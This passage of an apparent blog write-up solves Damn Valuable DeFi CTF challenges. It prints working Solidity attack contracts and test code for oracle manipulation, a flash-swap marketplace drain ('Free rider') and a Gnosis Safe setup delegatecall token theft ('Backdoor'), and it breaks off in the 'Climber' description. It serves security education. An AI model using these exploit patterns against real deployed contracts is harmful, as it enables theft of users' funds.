class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">const</span> deadline <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBlock</span><span class=\"token punctuation\">(</span><span class=\"token string\">'latest'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>uniswapRouter<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token constant\">ATTACKER_INITIAL_TOKEN_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>uniswapRouter<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">swapExactTokensForETH</span><span class=\"token punctuation\">(</span><span class=\"token constant\">ATTACKER_INITIAL_TOKEN_BALANCE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>weth<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> deadline<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">let</span> calculatedDeposit <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">formatEther</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>BigNumber<span class=\"token punctuation\">.</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>lendingPool<span class=\"token punctuation\">.</span><span class=\"token function\">calculateDepositOfWETHRequired</span><span class=\"token punctuation\">(</span><span class=\"token constant\">POOL_INITIAL_TOKEN_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">let</span> calculatedDepositToStringInETH <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>Math<span class=\"token punctuation\">.</span><span class=\"token function\">ceil</span><span class=\"token punctuation\">(</span>calculatedDeposit <span class=\"token operator\">*</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>weth<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span> calculatedDepositToStringInETH <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>weth<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>lendingPool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> calculatedDepositToStringInETH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>lendingPool<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">borrow</span><span class=\"token punctuation\">(</span><span class=\"token constant\">POOL_INITIAL_TOKEN_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<br>\n<hr>\n<h2 id=\"challenge-name-free-rider\" style=\"position:relative;\"><a href=\"#challenge-name-free-rider\" aria-label=\"challenge name free rider permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge name: Free rider</h2>\n<h3 id=\"challenge-description-8\" style=\"position:relative;\"><a href=\"#challenge-description-8\" aria-label=\"challenge description 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge description:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.\n\nA buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn't know how to do it. So it's offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.\n\nYou want to build some rep with this buyer, so you've agreed with the plan.\n\nSadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.</code></pre></div>\n<br>\n<p>In this challenge, we have to take 6 NFT from marketplace with only 0.5 ether. In addition, NFT is 15 ether worth. The vulnerability is in the <code class=\"language-text\">_buyOne()</code> function. Here is the line that is vulnerable.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">    token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);\n    payable(token.ownerOf(tokenId)).sendValue(priceToPay);</code></pre></div>\n<br>\n<p>If someone buys NFT, the marketplace transfer the NFT to buyer first. Then send value to token owner, which is now buyer. If only we could get 15 ETH, we can take all NFTs from marketplace. Here is where flash swap is needed. We can get 15 ETH for an instant from <code class=\"language-text\">Uniswap</code>. In <code class=\"language-text\">swap()</code> function in Uniswap pair, we are allow to send data to call <code class=\"language-text\">uniswapV2Call()</code>. We just need to create <code class=\"language-text\">uniswapV2Call()</code> function that buys NFT and return funds to Uniswap pair contract. Here is attack contract.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">AttackerFreeRider</span> <span class=\"token keyword\">is</span> IUniswapV2Callee <span class=\"token punctuation\">{</span>\n\n    IUniswapV2Pair <span class=\"token keyword\">public</span> immutable pair<span class=\"token punctuation\">;</span>\n    FreeRiderNFTMarketplace <span class=\"token keyword\">public</span> immutable marketplace<span class=\"token punctuation\">;</span>\n    FreeRiderBuyer <span class=\"token keyword\">public</span> immutable partner<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span>  owner<span class=\"token punctuation\">;</span>\n    IERC721 <span class=\"token keyword\">public</span> immutable nft<span class=\"token punctuation\">;</span>\n    IWETH <span class=\"token keyword\">public</span> immutable weth<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> tokenIds <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _pair<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _nft<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _marketplace<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _partner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _weth<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        pair <span class=\"token operator\">=</span> <span class=\"token function\">IUniswapV2Pair</span><span class=\"token punctuation\">(</span>_pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        nft <span class=\"token operator\">=</span> <span class=\"token function\">IERC721</span><span class=\"token punctuation\">(</span>_nft<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        marketplace <span class=\"token operator\">=</span> <span class=\"token function\">FreeRiderNFTMarketplace</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>_marketplace<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        partner <span class=\"token operator\">=</span> <span class=\"token function\">FreeRiderBuyer</span><span class=\"token punctuation\">(</span>_partner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        weth <span class=\"token operator\">=</span> <span class=\"token function\">IWETH</span><span class=\"token punctuation\">(</span>_weth<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        owner <span class=\"token operator\">=</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attackMarketPlace</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// pair의 swap을 실행시키면 line 33의 uniswapV2Call function 이 실행됨</span>\n        pair<span class=\"token punctuation\">.</span><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">uniswapV2Call</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount0<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> override <span class=\"token punctuation\">{</span>\n        \n        weth<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span>amount0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        marketplace<span class=\"token punctuation\">.</span>buyMany<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> <span class=\"token number\">15</span> ether<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>tokenIds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        weth<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> <span class=\"token number\">16</span> ether<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        weth<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>pair<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span><span class=\"token number\">16e18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span> tokenIds<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            nft<span class=\"token punctuation\">.</span><span class=\"token function\">safeTransferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>partner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n        owner<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">onERC721Received</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _tokenId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes4</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> IERC721Receiver<span class=\"token punctuation\">.</span>onERC721Received<span class=\"token punctuation\">.</span>selector<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span></code></pre></div>\n<br>\n<p>In <code class=\"language-text\">uniswapV2Call()</code> function, first withdraw ETH from WETH contract. Secondly, call <code class=\"language-text\">buyMany()</code> function with 15 ETH. As we buy one NFT with 15 ETH, it will return 15 ETH. Since marketplace have 90 ETH balance, marketplace will pay for our purchase. After buy NFTs, we return ETH to Uniswap. Then send NFT to our partner. It will trigger the partner to transfer 45 ETH that was promised.</p>\n<hr>\n<h2 id=\"challenge-name-backdoor\" style=\"position:relative;\"><a href=\"#challenge-name-backdoor\" aria-label=\"challenge name backdoor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge name: Backdoor</h2>\n<h3 id=\"challenge-description-9\" style=\"position:relative;\"><a href=\"#challenge-description-9\" aria-label=\"challenge description 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge description:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.\n\nTo make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.\n\nCurrently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.\n\nYour goal is to take all funds from the registry. In a single transaction.</code></pre></div>\n<br>\n<p>In this challenge, our goal is to take all funds from thie registry. If we look at wallet resigtry contract, it is a proxy callback contract. Also <code class=\"language-text\">proxyCreated()</code> function, the callback function, we can see the parameter <code class=\"language-text\">initializer</code> must be a <code class=\"language-text\">GnosisSafe.setup.selector</code>. Also this setup function is called during <code class=\"language-text\">GnosisSafeProxyFactory.createProxyWithCallback()</code>. When <code class=\"language-text\">setup()</code> function is called, it takes a payload <code class=\"language-text\">to</code> and <code class=\"language-text\">data</code> and etc. The <code class=\"language-text\">setupModules()</code> inside <code class=\"language-text\">setup()</code> function will trigger delegate call to <code class=\"language-text\">to</code> with the <code class=\"language-text\">data</code> as a payload. Here is the vulnerable spot. We can set the module to be our attack contract, and run the <code class=\"language-text\">data</code> payload. Here is the attack contract.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">AttackBackdoor</span> <span class=\"token punctuation\">{</span>\n    \n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> masterCopy<span class=\"token punctuation\">;</span>\n    IERC20 <span class=\"token keyword\">public</span> immutable token<span class=\"token punctuation\">;</span>\n    GnosisSafeProxyFactory <span class=\"token keyword\">public</span> immutable proxyFactory<span class=\"token punctuation\">;</span> \n    IProxyCreationCallback <span class=\"token keyword\">public</span> immutable wallet<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _masterCopy<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _token<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _proxyFactory<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _wallet<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        masterCopy <span class=\"token operator\">=</span> _masterCopy<span class=\"token punctuation\">;</span> \n        token <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>_token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        proxyFactory <span class=\"token operator\">=</span> <span class=\"token function\">GnosisSafeProxyFactory</span><span class=\"token punctuation\">(</span>_proxyFactory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        wallet <span class=\"token operator\">=</span> <span class=\"token function\">IProxyCreationCallback</span><span class=\"token punctuation\">(</span>_wallet<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> users<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> i<span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span><span class=\"token number\">4</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> dataToApprove <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"approve(address,uint256)\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n            <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> owners <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            owners<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> users<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> setUpData <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"setup(address[],uint256,address,bytes,address,address,uint256,address)\"</span><span class=\"token punctuation\">,</span> owners<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> dataToApprove<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            GnosisSafeProxy proxy <span class=\"token operator\">=</span> proxyFactory<span class=\"token punctuation\">.</span><span class=\"token function\">createProxyWithCallback</span><span class=\"token punctuation\">(</span>masterCopy<span class=\"token punctuation\">,</span> setUpData<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> wallet<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n            \n            token<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>proxy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<br>\n<p>First we need to approve function, that will be delegate called by the proxy contract. This will approve the attack contract to transfer the distributed token. We need to make a token approving data and put into <code class=\"language-text\">setup()</code> function’s payload. Then we can transfer the token to the attacker’s address, and just repeat this 4 times.</p>\n<hr>\n<h2 id=\"challenge-name-climber\" style=\"position:relative;\"><a href=\"#challenge-name-climber\" aria-label=\"challenge name climber permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge name: Climber</h2>\n<h3 id=\"challenge-description-10\" style=\"position:relative;\"><a href=\"#challenge-description-10\" aria-label=\"challenge description 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Challenge description:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">There's a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.\n\nThe owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.\n\nOn the vault there's an additional role with powers to sweep all tokens in case of an emergency.\n\nOn the 